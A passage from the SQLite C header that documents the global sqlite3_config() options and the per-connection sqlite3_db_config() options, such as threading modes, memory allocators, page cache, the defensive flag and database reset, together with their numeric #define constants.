** the call worked.  The [sqlite3_config()] interface will return a
** non-zero [error code] if a discontinued or unsupported configuration option
** is invoked.
**
** <dl>
** [[SQLITE_CONFIG_SINGLETHREAD]] <dt>SQLITE_CONFIG_SINGLETHREAD</dt>
** <dd>There are no arguments to this option.  ^This option sets the
** [threading mode] to Single-thread.  In other words, it disables
** all mutexing and puts SQLite into a mode where it can only be used
** by a single thread.   ^If SQLite is compiled with
** the [SQLITE_THREADSAFE | SQLITE_THREADSAFE=0] compile-time option then
** it is not possible to change the [threading mode] from its default
** value of Single-thread and so [sqlite3_config()] will return 
** [SQLITE_ERROR] if called with the SQLITE_CONFIG_SINGLETHREAD
** configuration option.</dd>
**
** [[SQLITE_CONFIG_MULTITHREAD]] <dt>SQLITE_CONFIG_MULTITHREAD</dt>
** <dd>There are no arguments to this option.  ^This option sets the
** [threading mode] to Multi-thread.  In other words, it disables
** mutexing on [database connection] and [prepared statement] objects.
** The application is responsible for serializing access to
** [database connections] and [prepared statements].  But other mutexes
** are enabled so that SQLite will be safe to use in a multi-threaded
** environment as long as no two threads attempt to use the same
** [database connection] at the same time.  ^If SQLite is compiled with
** the [SQLITE_THREADSAFE | SQLITE_THREADSAFE=0] compile-time option then
** it is not possible to set the Multi-thread [threading mode] and
** [sqlite3_config()] will return [SQLITE_ERROR] if called with the
** SQLITE_CONFIG_MULTITHREAD configuration option.</dd>
**
** [[SQLITE_CONFIG_SERIALIZED]] <dt>SQLITE_CONFIG_SERIALIZED</dt>
** <dd>There are no arguments to this option.  ^This option sets the
** [threading mode] to Serialized. In other words, this option enables
** all mutexes including the recursive
** mutexes on [database connection] and [prepared statement] objects.
** In this mode (which is the default when SQLite is compiled with
** [SQLITE_THREADSAFE=1]) the SQLite library will itself serialize access
** to [database connections] and [prepared statements] so that the
** application is free to use the same [database connection] or the
** same [prepared statement] in different threads at the same time.
** ^If SQLite is compiled with
** the [SQLITE_THREADSAFE | SQLITE_THREADSAFE=0] compile-time option then
** it is not possible to set the Serialized [threading mode] and
** [sqlite3_config()] will return [SQLITE_ERROR] if called with the
** SQLITE_CONFIG_SERIALIZED configuration option.</dd>
**
** [[SQLITE_CONFIG_MALLOC]] <dt>SQLITE_CONFIG_MALLOC</dt>
** <dd> ^(The SQLITE_CONFIG_MALLOC option takes a single argument which is 
** a pointer to an instance of the [sqlite3_mem_methods] structure.
** The argument specifies
** alternative low-level memory allocation routines to be used in place of
** the memory allocation routines built into SQLite.)^ ^SQLite makes
** its own private copy of the content of the [sqlite3_mem_methods] structure
** before the [sqlite3_config()] call returns.</dd>
**
** [[SQLITE_CONFIG_GETMALLOC]] <dt>SQLITE_CONFIG_GETMALLOC</dt>
** <dd> ^(The SQLITE_CONFIG_GETMALLOC option takes a single argument which
** is a pointer to an instance of the [sqlite3_mem_methods] structure.
** The [sqlite3_mem_methods]
** structure is filled with the currently defined memory allocation routines.)^
** This option can be used to overload the default memory allocation
** routines with a wrapper that simulations memory allocation failure or
** tracks memory usage, for example. </dd>
**
** [[SQLITE_CONFIG_SMALL_MALLOC]] <dt>SQLITE_CONFIG_SMALL_MALLOC</dt>
** <dd> ^The SQLITE_CONFIG_SMALL_MALLOC option takes single argument of
** type int, interpreted as a boolean, which if true provides a hint to
** SQLite that it should avoid large memory allocations if possible.
** SQLite will run faster if it is free to make large memory allocations,
** but some application might prefer to run slower in exchange for
** guarantees about memory fragmentation that are possible if large
** allocations are avoided.  This hint is normally off.
** </dd>
**
** [[SQLITE_CONFIG_MEMSTATUS]] <dt>SQLITE_CONFIG_MEMSTATUS</dt>
** <dd> ^The SQLITE_CONFIG_MEMSTATUS option takes single argument of type int,
** interpreted as a boolean, which enables or disables the collection of
** memory allocation statistics. ^(When memory allocation statistics are
** disabled, the following SQLite interfaces become non-operational:
**   <ul>
**   <li> [sqlite3_memory_used()]
**   <li> [sqlite3_memory_highwater()]
**   <li> [sqlite3_soft_heap_limit64()]
**   <li> [sqlite3_status64()]
**   </ul>)^
** ^Memory allocation statistics are enabled by default unless SQLite is
** compiled with [SQLITE_DEFAULT_MEMSTATUS]=0 in which case memory
** allocation statistics are disabled by default.
** </dd>
**
** [[SQLITE_CONFIG_SCRATCH]] <dt>SQLITE_CONFIG_SCRATCH</dt>
** <dd> The SQLITE_CONFIG_SCRATCH option is no longer used.
** </dd>
**
** [[SQLITE_CONFIG_PAGECACHE]] <dt>SQLITE_CONFIG_PAGECACHE</dt>
** <dd> ^The SQLITE_CONFIG_PAGECACHE option specifies a memory pool
** that SQLite can use for the database page cache with the default page
** cache implementation.  
** This configuration option is a no-op if an application-define page
** cache implementation is loaded using the [SQLITE_CONFIG_PCACHE2].
** ^There are three arguments to SQLITE_CONFIG_PAGECACHE: A pointer to
** 8-byte aligned memory (pMem), the size of each page cache line (sz),
** and the number of cache lines (N).
** The sz argument should be the size of the largest database page
** (a power of two between 512 and 65536) plus some extra bytes for each
** page header.  ^The number of extra bytes needed by the page header
** can be determined using [SQLITE_CONFIG_PCACHE_HDRSZ].
** ^It is harmless, apart from the wasted memory,
** for the sz parameter to be larger than necessary.  The pMem
** argument must be either a NULL pointer or a pointer to an 8-byte
** aligned block of memory of at least sz*N bytes, otherwise
** subsequent behavior is undefined.
** ^When pMem is not NULL, SQLite will strive to use the memory provided
** to satisfy page cache needs, falling back to [sqlite3_malloc()] if
** a page cache line is larger than sz bytes or if all of the pMem buffer
** is exhausted.
** ^If pMem is NULL and N is non-zero, then each database connection
** does an initial bulk allocation for page cache memory
** from [sqlite3_malloc()] sufficient for N cache lines if N is positive or
** of -1024*N bytes if N is negative, . ^If additional
** page cache memory is needed beyond what is provided by the initial
** allocation, then SQLite goes to [sqlite3_malloc()] separately for each
** additional cache line. </dd>
**
** [[SQLITE_CONFIG_HEAP]] <dt>SQLITE_CONFIG_HEAP</dt>
** <dd> ^The SQLITE_CONFIG_HEAP option specifies a static memory buffer 
** that SQLite will use for all of its dynamic memory allocation needs
** beyond those provided for by [SQLITE_CONFIG_PAGECACHE].
** ^The SQLITE_CONFIG_HEAP option is only available if SQLite is compiled
** with either [SQLITE_ENABLE_MEMSYS3] or [SQLITE_ENABLE_MEMSYS5] and returns
** [SQLITE_ERROR] if invoked otherwise.
** ^There are three arguments to SQLITE_CONFIG_HEAP:
** An 8-byte aligned pointer to the memory,
** the number of bytes in the memory buffer, and the minimum allocation size.
** ^If the first pointer (the memory pointer) is NULL, then SQLite reverts
** to using its default memory allocator (the system malloc() implementation),
** undoing any prior invocation of [SQLITE_CONFIG_MALLOC].  ^If the
** memory pointer is not NULL then the alternative memory
** allocator is engaged to handle all of SQLites memory allocation needs.
** The first pointer (the memory pointer) must be aligned to an 8-byte
** boundary or subsequent behavior of SQLite will be undefined.
** The minimum allocation size is capped at 2**12. Reasonable values
** for the minimum allocation size are 2**5 through 2**8.</dd>
**
** [[SQLITE_CONFIG_MUTEX]] <dt>SQLITE_CONFIG_MUTEX</dt>
** <dd> ^(The SQLITE_CONFIG_MUTEX option takes a single argument which is a
** pointer to an instance of the [sqlite3_mutex_methods] structure.
** The argument specifies alternative low-level mutex routines to be used
** in place the mutex routines built into SQLite.)^  ^SQLite makes a copy of
** the content of the [sqlite3_mutex_methods] structure before the call to
** [sqlite3_config()] returns. ^If SQLite is compiled with
** the [SQLITE_THREADSAFE | SQLITE_THREADSAFE=0] compile-time option then
** the entire mutexing subsystem is omitted from the build and hence calls to
** [sqlite3_config()] with the SQLITE_CONFIG_MUTEX configuration option will
** return [SQLITE_ERROR].</dd>
**
** [[SQLITE_CONFIG_GETMUTEX]] <dt>SQLITE_CONFIG_GETMUTEX</dt>
** <dd> ^(The SQLITE_CONFIG_GETMUTEX option takes a single argument which
** is a pointer to an instance of the [sqlite3_mutex_methods] structure.  The
** [sqlite3_mutex_methods]
** structure is filled with the currently defined mutex routines.)^
** This option can be used to overload the default mutex allocation
** routines with a wrapper used to track mutex usage for performance
** profiling or testing, for example.   ^If SQLite is compiled with
** the [SQLITE_THREADSAFE | SQLITE_THREADSAFE=0] compile-time option then
** the entire mutexing subsystem is omitted from the build and hence calls to
** [sqlite3_config()] with the SQLITE_CONFIG_GETMUTEX configuration option will
** return [SQLITE_ERROR].</dd>
**
** [[SQLITE_CONFIG_LOOKASIDE]] <dt>SQLITE_CONFIG_LOOKASIDE</dt>
** <dd> ^(The SQLITE_CONFIG_LOOKASIDE option takes two arguments that determine
** the default size of lookaside memory on each [database connection].
** The first argument is the
** size of each lookaside buffer slot and the second is the number of
** slots allocated to each database connection.)^  ^(SQLITE_CONFIG_LOOKASIDE
** sets the <i>default</i> lookaside size. The [SQLITE_DBCONFIG_LOOKASIDE]
** option to [sqlite3_db_config()] can be used to change the lookaside
** configuration on individual connections.)^ </dd>
**
** [[SQLITE_CONFIG_PCACHE2]] <dt>SQLITE_CONFIG_PCACHE2</dt>
** <dd> ^(The SQLITE_CONFIG_PCACHE2 option takes a single argument which is 
** a pointer to an [sqlite3_pcache_methods2] object.  This object specifies
** the interface to a custom page cache implementation.)^
** ^SQLite makes a copy of the [sqlite3_pcache_methods2] object.</dd>
**
** [[SQLITE_CONFIG_GETPCACHE2]] <dt>SQLITE_CONFIG_GETPCACHE2</dt>
** <dd> ^(The SQLITE_CONFIG_GETPCACHE2 option takes a single argument which
** is a pointer to an [sqlite3_pcache_methods2] object.  SQLite copies of
** the current page cache implementation into that object.)^ </dd>
**
** [[SQLITE_CONFIG_LOG]] <dt>SQLITE_CONFIG_LOG</dt>
** <dd> The SQLITE_CONFIG_LOG option is used to configure the SQLite
** global [error log].
** (^The SQLITE_CONFIG_LOG option takes two arguments: a pointer to a
** function with a call signature of void(*)(void*,int,const char*), 
** and a pointer to void. ^If the function pointer is not NULL, it is
** invoked by [sqlite3_log()] to process each logging event.  ^If the
** function pointer is NULL, the [sqlite3_log()] interface becomes a no-op.
** ^The void pointer that is the second argument to SQLITE_CONFIG_LOG is
** passed through as the first parameter to the application-defined logger
** function whenever that function is invoked.  ^The second parameter to
** the logger function is a copy of the first parameter to the corresponding
** [sqlite3_log()] call and is intended to be a [result code] or an
** [extended result code].  ^The third parameter passed to the logger is
** log message after formatting via [sqlite3_snprintf()].
** The SQLite logging interface is not reentrant; the logger function
** supplied by the application must not invoke any SQLite interface.
** In a multi-threaded application, the application-defined logger
** function must be threadsafe. </dd>
**
** [[SQLITE_CONFIG_URI]] <dt>SQLITE_CONFIG_URI
** <dd>^(The SQLITE_CONFIG_URI option takes a single argument of type int.
** If non-zero, then URI handling is globally enabled. If the parameter is zero,
** then URI handling is globally disabled.)^ ^If URI handling is globally
** enabled, all filenames passed to [sqlite3_open()], [sqlite3_open_v2()],
** [sqlite3_open16()] or
** specified as part of [ATTACH] commands are interpreted as URIs, regardless
** of whether or not the [SQLITE_OPEN_URI] flag is set when the database
** connection is opened. ^If it is globally disabled, filenames are
** only interpreted as URIs if the SQLITE_OPEN_URI flag is set when the
** database connection is opened. ^(By default, URI handling is globally
** disabled. The default value may be changed by compiling with the
** [SQLITE_USE_URI] symbol defined.)^
**
** [[SQLITE_CONFIG_COVERING_INDEX_SCAN]] <dt>SQLITE_CONFIG_COVERING_INDEX_SCAN
** <dd>^The SQLITE_CONFIG_COVERING_INDEX_SCAN option takes a single integer
** argument which is interpreted as a boolean in order to enable or disable
** the use of covering indices for full table scans in the query optimizer.
** ^The default setting is determined
** by the [SQLITE_ALLOW_COVERING_INDEX_SCAN] compile-time option, or is "on"
** if that compile-time option is omitted.
** The ability to disable the use of covering indices for full table scans
** is because some incorrectly coded legacy applications might malfunction
** when the optimization is enabled.  Providing the ability to
** disable the optimization allows the older, buggy application code to work
** without change even with newer versions of SQLite.
**
** [[SQLITE_CONFIG_PCACHE]] [[SQLITE_CONFIG_GETPCACHE]]
** <dt>SQLITE_CONFIG_PCACHE and SQLITE_CONFIG_GETPCACHE
** <dd> These options are obsolete and should not be used by new code.
** They are retained for backwards compatibility but are now no-ops.
** </dd>
**
** [[SQLITE_CONFIG_SQLLOG]]
** <dt>SQLITE_CONFIG_SQLLOG
** <dd>This option is only available if sqlite is compiled with the
** [SQLITE_ENABLE_SQLLOG] pre-processor macro defined. The first argument should
** be a pointer to a function of type void(*)(void*,sqlite3*,const char*, int).
** The second should be of type (void*). The callback is invoked by the library
** in three separate circumstances, identified by the value passed as the
** fourth parameter. If the fourth parameter is 0, then the database connection
** passed as the second argument has just been opened. The third argument
** points to a buffer containing the name of the main database file. If the
** fourth parameter is 1, then the SQL statement that the third parameter
** points to has just been executed. Or, if the fourth parameter is 2, then
** the connection being passed as the second parameter is being closed. The
** third parameter is passed NULL In this case.  An example of using this
** configuration option can be seen in the "test_sqllog.c" source file in
** the canonical SQLite source tree.</dd>
**
** [[SQLITE_CONFIG_MMAP_SIZE]]
** <dt>SQLITE_CONFIG_MMAP_SIZE
** <dd>^SQLITE_CONFIG_MMAP_SIZE takes two 64-bit integer (sqlite3_int64) values
** that are the default mmap size limit (the default setting for
** [PRAGMA mmap_size]) and the maximum allowed mmap size limit.
** ^The default setting can be overridden by each database connection using
** either the [PRAGMA mmap_size] command, or by using the
** [SQLITE_FCNTL_MMAP_SIZE] file control.  ^(The maximum allowed mmap size
** will be silently truncated if necessary so that it does not exceed the
** compile-time maximum mmap size set by the
** [SQLITE_MAX_MMAP_SIZE] compile-time option.)^
** ^If either argument to this option is negative, then that argument is
** changed to its compile-time default.
**
** [[SQLITE_CONFIG_WIN32_HEAPSIZE]]
** <dt>SQLITE_CONFIG_WIN32_HEAPSIZE
** <dd>^The SQLITE_CONFIG_WIN32_HEAPSIZE option is only available if SQLite is
** compiled for Windows with the [SQLITE_WIN32_MALLOC] pre-processor macro
** defined. ^SQLITE_CONFIG_WIN32_HEAPSIZE takes a 32-bit unsigned integer value
** that specifies the maximum size of the created heap.
**
** [[SQLITE_CONFIG_PCACHE_HDRSZ]]
** <dt>SQLITE_CONFIG_PCACHE_HDRSZ
** <dd>^The SQLITE_CONFIG_PCACHE_HDRSZ option takes a single parameter which
** is a pointer to an integer and writes into that integer the number of extra
** bytes per page required for each page in [SQLITE_CONFIG_PAGECACHE].
** The amount of extra space required can change depending on the compiler,
** target platform, and SQLite version.
**
** [[SQLITE_CONFIG_PMASZ]]
** <dt>SQLITE_CONFIG_PMASZ
** <dd>^The SQLITE_CONFIG_PMASZ option takes a single parameter which
** is an unsigned integer and sets the "Minimum PMA Size" for the multithreaded
** sorter to that integer.  The default minimum PMA Size is set by the
** [SQLITE_SORTER_PMASZ] compile-time option.  New threads are launched
** to help with sort operations when multithreaded sorting
** is enabled (using the [PRAGMA threads] command) and the amount of content
** to be sorted exceeds the page size times the minimum of the
** [PRAGMA cache_size] setting and this value.
**
** [[SQLITE_CONFIG_STMTJRNL_SPILL]]
** <dt>SQLITE_CONFIG_STMTJRNL_SPILL
** <dd>^The SQLITE_CONFIG_STMTJRNL_SPILL option takes a single parameter which
** becomes the [statement journal] spill-to-disk threshold.  
** [Statement journals] are held in memory until their size (in bytes)
** exceeds this threshold, at which point they are written to disk.
** Or if the threshold is -1, statement journals are always held
** exclusively in memory.
** Since many statement journals never become large, setting the spill
** threshold to a value such as 64KiB can greatly reduce the amount of
** I/O required to support statement rollback.
** The default value for this setting is controlled by the
** [SQLITE_STMTJRNL_SPILL] compile-time option.
**
** [[SQLITE_CONFIG_SORTERREF_SIZE]]
** <dt>SQLITE_CONFIG_SORTERREF_SIZE
** <dd>The SQLITE_CONFIG_SORTERREF_SIZE option accepts a single parameter
** of type (int) - the new value of the sorter-reference size threshold.
** Usually, when SQLite uses an external sort to order records according
** to an ORDER BY clause, all fields required by the caller are present in the
** sorted records. However, if SQLite determines based on the declared type
** of a table column that its values are likely to be very large - larger
** than the configured sorter-reference size threshold - then a reference
** is stored in each sorted record and the required column values loaded
** from the database as records are returned in sorted order. The default
** value for this option is to never use this optimization. Specifying a 
** negative value for this option restores the default behaviour.
** This option is only available if SQLite is compiled with the
** [SQLITE_ENABLE_SORTER_REFERENCES] compile-time option.
**
** [[SQLITE_CONFIG_MEMDB_MAXSIZE]]
** <dt>SQLITE_CONFIG_MEMDB_MAXSIZE
** <dd>The SQLITE_CONFIG_MEMDB_MAXSIZE option accepts a single parameter
** [sqlite3_int64] parameter which is the default maximum size for an in-memory
** database created using [sqlite3_deserialize()].  This default maximum
** size can be adjusted up or down for individual databases using the
** [SQLITE_FCNTL_SIZE_LIMIT] [sqlite3_file_control|file-control].  If this
** configuration setting is never used, then the default maximum is determined
** by the [SQLITE_MEMDB_DEFAULT_MAXSIZE] compile-time option.  If that
** compile-time option is not set, then the default maximum is 1073741824.
** </dl>
*/
#define SQLITE_CONFIG_SINGLETHREAD  1  /* nil */
#define SQLITE_CONFIG_MULTITHREAD   2  /* nil */
#define SQLITE_CONFIG_SERIALIZED    3  /* nil */
#define SQLITE_CONFIG_MALLOC        4  /* sqlite3_mem_methods* */
#define SQLITE_CONFIG_GETMALLOC     5  /* sqlite3_mem_methods* */
#define SQLITE_CONFIG_SCRATCH       6  /* No longer used */
#define SQLITE_CONFIG_PAGECACHE     7  /* void*, int sz, int N */
#define SQLITE_CONFIG_HEAP          8  /* void*, int nByte, int min */
#define SQLITE_CONFIG_MEMSTATUS     9  /* boolean */
#define SQLITE_CONFIG_MUTEX        10  /* sqlite3_mutex_methods* */
#define SQLITE_CONFIG_GETMUTEX     11  /* sqlite3_mutex_methods* */
/* previously SQLITE_CONFIG_CHUNKALLOC 12 which is now unused. */ 
#define SQLITE_CONFIG_LOOKASIDE    13  /* int int */
#define SQLITE_CONFIG_PCACHE       14  /* no-op */
#define SQLITE_CONFIG_GETPCACHE    15  /* no-op */
#define SQLITE_CONFIG_LOG          16  /* xFunc, void* */
#define SQLITE_CONFIG_URI          17  /* int */
#define SQLITE_CONFIG_PCACHE2      18  /* sqlite3_pcache_methods2* */
#define SQLITE_CONFIG_GETPCACHE2   19  /* sqlite3_pcache_methods2* */
#define SQLITE_CONFIG_COVERING_INDEX_SCAN 20  /* int */
#define SQLITE_CONFIG_SQLLOG       21  /* xSqllog, void* */
#define SQLITE_CONFIG_MMAP_SIZE    22  /* sqlite3_int64, sqlite3_int64 */
#define SQLITE_CONFIG_WIN32_HEAPSIZE      23  /* int nByte */
#define SQLITE_CONFIG_PCACHE_HDRSZ        24  /* int *psz */
#define SQLITE_CONFIG_PMASZ               25  /* unsigned int szPma */
#define SQLITE_CONFIG_STMTJRNL_SPILL      26  /* int nByte */
#define SQLITE_CONFIG_SMALL_MALLOC        27  /* boolean */
#define SQLITE_CONFIG_SORTERREF_SIZE      28  /* int nByte */
#define SQLITE_CONFIG_MEMDB_MAXSIZE       29  /* sqlite3_int64 */

/*
** CAPI3REF: Database Connection Configuration Options
**
** These constants are the available integer configuration options that
** can be passed as the second argument to the [sqlite3_db_config()] interface.
**
** New configuration options may be added in future releases of SQLite.
** Existing configuration options might be discontinued.  Applications
** should check the return code from [sqlite3_db_config()] to make sure that
** the call worked.  ^The [sqlite3_db_config()] interface will return a
** non-zero [error code] if a discontinued or unsupported configuration option
** is invoked.
**
** <dl>
** [[SQLITE_DBCONFIG_LOOKASIDE]]
** <dt>SQLITE_DBCONFIG_LOOKASIDE</dt>
** <dd> ^This option takes three additional arguments that determine the 
** [lookaside memory allocator] configuration for the [database connection].
** ^The first argument (the third parameter to [sqlite3_db_config()] is a
** pointer to a memory buffer to use for lookaside memory.
** ^The first argument after the SQLITE_DBCONFIG_LOOKASIDE verb
** may be NULL in which case SQLite will allocate the
** lookaside buffer itself using [sqlite3_malloc()]. ^The second argument is the
** size of each lookaside buffer slot.  ^The third argument is the number of
** slots.  The size of the buffer in the first argument must be greater than
** or equal to the product of the second and third arguments.  The buffer
** must be aligned to an 8-byte boundary.  ^If the second argument to
** SQLITE_DBCONFIG_LOOKASIDE is not a multiple of 8, it is internally
** rounded down to the next smaller multiple of 8.  ^(The lookaside memory
** configuration for a database connection can only be changed when that
** connection is not currently using lookaside memory, or in other words
** when the "current value" returned by
** [sqlite3_db_status](D,[SQLITE_CONFIG_LOOKASIDE],...) is zero.
** Any attempt to change the lookaside memory configuration when lookaside
** memory is in use leaves the configuration unchanged and returns 
** [SQLITE_BUSY].)^</dd>
**
** [[SQLITE_DBCONFIG_ENABLE_FKEY]]
** <dt>SQLITE_DBCONFIG_ENABLE_FKEY</dt>
** <dd> ^This option is used to enable or disable the enforcement of
** [foreign key constraints].  There should be two additional arguments.
** The first argument is an integer which is 0 to disable FK enforcement,
** positive to enable FK enforcement or negative to leave FK enforcement
** unchanged.  The second parameter is a pointer to an integer into which
** is written 0 or 1 to indicate whether FK enforcement is off or on
** following this call.  The second parameter may be a NULL pointer, in
** which case the FK enforcement setting is not reported back. </dd>
**
** [[SQLITE_DBCONFIG_ENABLE_TRIGGER]]
** <dt>SQLITE_DBCONFIG_ENABLE_TRIGGER</dt>
** <dd> ^This option is used to enable or disable [CREATE TRIGGER | triggers].
** There should be two additional arguments.
** The first argument is an integer which is 0 to disable triggers,
** positive to enable triggers or negative to leave the setting unchanged.
** The second parameter is a pointer to an integer into which
** is written 0 or 1 to indicate whether triggers are disabled or enabled
** following this call.  The second parameter may be a NULL pointer, in
** which case the trigger setting is not reported back. </dd>
**
** [[SQLITE_DBCONFIG_ENABLE_VIEW]]
** <dt>SQLITE_DBCONFIG_ENABLE_VIEW</dt>
** <dd> ^This option is used to enable or disable [CREATE VIEW | views].
** There should be two additional arguments.
** The first argument is an integer which is 0 to disable views,
** positive to enable views or negative to leave the setting unchanged.
** The second parameter is a pointer to an integer into which
** is written 0 or 1 to indicate whether views are disabled or enabled
** following this call.  The second parameter may be a NULL pointer, in
** which case the view setting is not reported back. </dd>
**
** [[SQLITE_DBCONFIG_ENABLE_FTS3_TOKENIZER]]
** <dt>SQLITE_DBCONFIG_ENABLE_FTS3_TOKENIZER</dt>
** <dd> ^This option is used to enable or disable the
** [fts3_tokenizer()] function which is part of the
** [FTS3] full-text search engine extension.
** There should be two additional arguments.
** The first argument is an integer which is 0 to disable fts3_tokenizer() or
** positive to enable fts3_tokenizer() or negative to leave the setting
** unchanged.
** The second parameter is a pointer to an integer into which
** is written 0 or 1 to indicate whether fts3_tokenizer is disabled or enabled
** following this call.  The second parameter may be a NULL pointer, in
** which case the new setting is not reported back. </dd>
**
** [[SQLITE_DBCONFIG_ENABLE_LOAD_EXTENSION]]
** <dt>SQLITE_DBCONFIG_ENABLE_LOAD_EXTENSION</dt>
** <dd> ^This option is used to enable or disable the [sqlite3_load_extension()]
** interface independently of the [load_extension()] SQL function.
** The [sqlite3_enable_load_extension()] API enables or disables both the
** C-API [sqlite3_load_extension()] and the SQL function [load_extension()].
** There should be two additional arguments.
** When the first argument to this interface is 1, then only the C-API is
** enabled and the SQL function remains disabled.  If the first argument to
** this interface is 0, then both the C-API and the SQL function are disabled.
** If the first argument is -1, then no changes are made to state of either the
** C-API or the SQL function.
** The second parameter is a pointer to an integer into which
** is written 0 or 1 to indicate whether [sqlite3_load_extension()] interface
** is disabled or enabled following this call.  The second parameter may
** be a NULL pointer, in which case the new setting is not reported back.
** </dd>
**
** [[SQLITE_DBCONFIG_MAINDBNAME]] <dt>SQLITE_DBCONFIG_MAINDBNAME</dt>
** <dd> ^This option is used to change the name of the "main" database
** schema.  ^The sole argument is a pointer to a constant UTF8 string
** which will become the new schema name in place of "main".  ^SQLite
** does not make a copy of the new main schema name string, so the application
** must ensure that the argument passed into this DBCONFIG option is unchanged
** until after the database connection closes.
** </dd>
**
** [[SQLITE_DBCONFIG_NO_CKPT_ON_CLOSE]] 
** <dt>SQLITE_DBCONFIG_NO_CKPT_ON_CLOSE</dt>
** <dd> Usually, when a database in wal mode is closed or detached from a 
** database handle, SQLite checks if this will mean that there are now no 
** connections at all to the database. If so, it performs a checkpoint 
** operation before closing the connection. This option may be used to
** override this behaviour. The first parameter passed to this operation
** is an integer - positive to disable checkpoints-on-close, or zero (the
** default) to enable them, and negative to leave the setting unchanged.
** The second parameter is a pointer to an integer
** into which is written 0 or 1 to indicate whether checkpoints-on-close
** have been disabled - 0 if they are not disabled, 1 if they are.
** </dd>
**
** [[SQLITE_DBCONFIG_ENABLE_QPSG]] <dt>SQLITE_DBCONFIG_ENABLE_QPSG</dt>
** <dd>^(The SQLITE_DBCONFIG_ENABLE_QPSG option activates or deactivates
** the [query planner stability guarantee] (QPSG).  When the QPSG is active,
** a single SQL query statement will always use the same algorithm regardless
** of values of [bound parameters].)^ The QPSG disables some query optimizations
** that look at the values of bound parameters, which can make some queries
** slower.  But the QPSG has the advantage of more predictable behavior.  With
** the QPSG active, SQLite will always use the same query plan in the field as
** was used during testing in the lab.
** The first argument to this setting is an integer which is 0 to disable 
** the QPSG, positive to enable QPSG, or negative to leave the setting
** unchanged. The second parameter is a pointer to an integer into which
** is written 0 or 1 to indicate whether the QPSG is disabled or enabled
** following this call.
** </dd>
**
** [[SQLITE_DBCONFIG_TRIGGER_EQP]] <dt>SQLITE_DBCONFIG_TRIGGER_EQP</dt>
** <dd> By default, the output of EXPLAIN QUERY PLAN commands does not 
** include output for any operations performed by trigger programs. This
** option is used to set or clear (the default) a flag that governs this
** behavior. The first parameter passed to this operation is an integer -
** positive to enable output for trigger programs, or zero to disable it,
** or negative to leave the setting unchanged.
** The second parameter is a pointer to an integer into which is written 
** 0 or 1 to indicate whether output-for-triggers has been disabled - 0 if 
** it is not disabled, 1 if it is.  
** </dd>
**
** [[SQLITE_DBCONFIG_RESET_DATABASE]] <dt>SQLITE_DBCONFIG_RESET_DATABASE</dt>
** <dd> Set the SQLITE_DBCONFIG_RESET_DATABASE flag and then run
** [VACUUM] in order to reset a database back to an empty database
** with no schema and no content. The following process works even for
** a badly corrupted database file:
** <ol>
** <li> If the database connection is newly opened, make sure it has read the
**      database schema by preparing then discarding some query against the
**      database, or calling sqlite3_table_column_metadata(), ignoring any
**      errors.  This step is only necessary if the application desires to keep
**      the database in WAL mode after the reset if it was in WAL mode before
**      the reset.  
** <li> sqlite3_db_config(db, SQLITE_DBCONFIG_RESET_DATABASE, 1, 0);
** <li> [sqlite3_exec](db, "[VACUUM]", 0, 0, 0);
** <li> sqlite3_db_config(db, SQLITE_DBCONFIG_RESET_DATABASE, 0, 0);
** </ol>
** Because resetting a database is destructive and irreversible, the
** process requires the use of this obscure API and multiple steps to help
** ensure that it does not happen by accident.
**
** [[SQLITE_DBCONFIG_DEFENSIVE]] <dt>SQLITE_DBCONFIG_DEFENSIVE</dt>
** <dd>The SQLITE_DBCONFIG_DEFENSIVE option activates or deactivates the
** "defensive" flag for a database connection.  When the defensive
** flag is enabled, language features that allow ordinary SQL to 
** deliberately corrupt the database file are disabled.  The disabled
** features include but are not limited to the following:
** <ul>
** <li> The [PRAGMA writable_schema=ON] statement.
** <li> The [PRAGMA journal_mode=OFF] statement.
** <li> Writes to the [sqlite_dbpage] virtual table.
** <li> Direct writes to [shadow tables].
** </ul>
** </dd>
**
** [[SQLITE_DBCONFIG_WRITABLE_SCHEMA]] <dt>SQLITE_DBCONFIG_WRITABLE_SCHEMA</dt>
** <dd>The SQLITE_DBCONFIG_WRITABLE_SCHEMA option activates or deactivates the
** "writable_schema" flag. This has the same effect and is logically equivalent
** to setting [PRAGMA writable_schema=ON] or [PRAGMA writable_schema=OFF].
** The first argument to this setting is an integer which is 0 to disable 
** the writable_schema, positive to enable writable_schema, or negative to
** leave the setting unchanged. The second parameter is a pointer to an
** integer into which is written 0 or 1 to indicate whether the writable_schema
** is enabled or disabled following this call.
** </dd>
**
** [[SQLITE_DBCONFIG_LEGACY_ALTER_TABLE]]
** <dt>SQLITE_DBCONFIG_LEGACY_ALTER_TABLE</dt>
** <dd>The SQLITE_DBCONFIG_LEGACY_ALTER_TABLE option activates or deactivates
** the legacy behavior of the [ALTER TABLE RENAME] command such it
** behaves as it did prior to [version 3.24.0] (2018-06-04).  See the
** "Compatibility Notice" on the [ALTER TABLE RENAME documentation] for
** additional information. This feature can also be turned on and off
** using the [PRAGMA legacy_alter_table] statement.
** </dd>
**
** [[SQLITE_DBCONFIG_DQS_DML]]
** <dt>SQLITE_DBCONFIG_DQS_DML</td>
** <dd>The SQLITE_DBCONFIG_DQS_DML option activates or deactivates
** the legacy [double-quoted string literal] misfeature for DML statement
** only, that is DELETE, INSERT, SELECT, and UPDATE statements. The
** default value of this setting is determined by the [-DSQLITE_DQS]
** compile-time option.
** </dd>
**
** [[SQLITE_DBCONFIG_DQS_DDL]]
** <dt>SQLITE_DBCONFIG_DQS_DDL</td>
** <dd>The SQLITE_DBCONFIG_DQS option activates or deactivates
** the legacy [double-quoted string literal] misfeature for DDL statements,
** such as CREATE TABLE and CREATE INDEX. The
** default value of this setting is determined by the [-DSQLITE_DQS]
** compile-time option.
** </dd>
** </dl>
*/
#define SQLITE_DBCONFIG_MAINDBNAME            1000 /* const char* */
#define SQLITE_DBCONFIG_LOOKASIDE             1001 /* void* int int */
#define SQLITE_DBCONFIG_ENABLE_FKEY           1002 /* int int* */
#define SQLITE_DBCONFIG_ENABLE_TRIGGER        1003 /* int int* */
#define SQLITE_DBCONFIG_ENABLE_FTS3_TOKENIZER 1004 /* int int* */
#define SQLITE_DBCONFIG_ENABLE_LOAD_EXTENSION 1005 /* int int* */
#define SQLITE_DBCONFIG_NO_CKPT_ON_CLOSE      1006 /* int int* */
#define SQLITE_DBCONFIG_ENABLE_QPSG           1007 /* int int* */
#define SQLITE_DBCONFIG_TRIGGER_EQP           1008 /* int int* */
#define SQLITE_DBCONFIG_RESET_DATABASE        1009 /* int int* */
#define SQLITE_DBCONFIG_DEFENSIVE             1010 /* int int* */
#define SQLITE_DBCONFIG_WRITABLE_SCHEMA       1011 /* int int* */
